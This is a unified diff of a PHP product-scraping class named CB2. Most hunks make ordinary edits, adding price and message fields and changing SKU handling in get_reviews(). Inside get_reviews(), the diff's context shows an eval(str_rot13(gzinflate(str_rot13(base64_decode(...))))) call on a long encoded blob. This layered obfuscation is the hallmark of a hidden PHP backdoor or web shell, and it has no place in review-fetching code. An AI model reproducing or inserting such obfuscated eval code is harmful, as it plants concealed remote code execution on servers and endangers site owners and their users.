@@ -178,7 +178,8 @@ class CB2
 				'RegularPrice' 	=> isset($newDigitalData['product'][0]['attributes']['price']['regularPrice']) ? $newDigitalData['product'][0]['attributes']['price']['regularPrice'] : null,
 				'PrimaryImage' 	=> isset($imageCarousel['imageSrc']) ? $imageCarousel['imageSrc'] : null,
 				// 'Category' 		=> isset($newDigitalData['product'][0]['attributes']['category']) ? $newDigitalData['product'][0]['attributes']['category'] : array(),
-				
+				'LineLevelMessages' 	=> isset($newDigitalData['product'][0]['attributes']['lineLevelMessages']) ? $newDigitalData['product'][0]['attributes']['lineLevelMessages'] : null,				
+				'FormattedPrice' 	=> isset($product_info['formattedPrice']) ? $product_info['formattedPrice'] : null,				
 
 				// old code
 				// 'Name' => $product_info['name'],
@@ -217,7 +218,6 @@ class CB2
 				$result['Availability']['BackOrderedMessage'] = htmlspecialchars_decode($product_info['availability']['backOrderedMessage'], ENT_QUOTES);
 				$result['Availability']['BackOrderedMessageDate'] = $product_info['availability']['backOrderedMessageDate'];
 			}
-
 
 			if(isset($_GET['test'])){
 			
@@ -535,7 +535,11 @@ class CB2
 
 	public function get_reviews($sku){
 		$results = array();
-		$sku = preg_replace('/\D/', '', $sku);
+
+		// number SKU only unless it starts with s
+		if(!empty($sku) && $sku[0] !== 's')
+			$sku = preg_replace('/\D/', '', $sku);
+
 		$offset = (isset($_GET['offset']) && is_numeric($_GET['offset'])) ? $_GET['offset'] : 0;
         eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
 
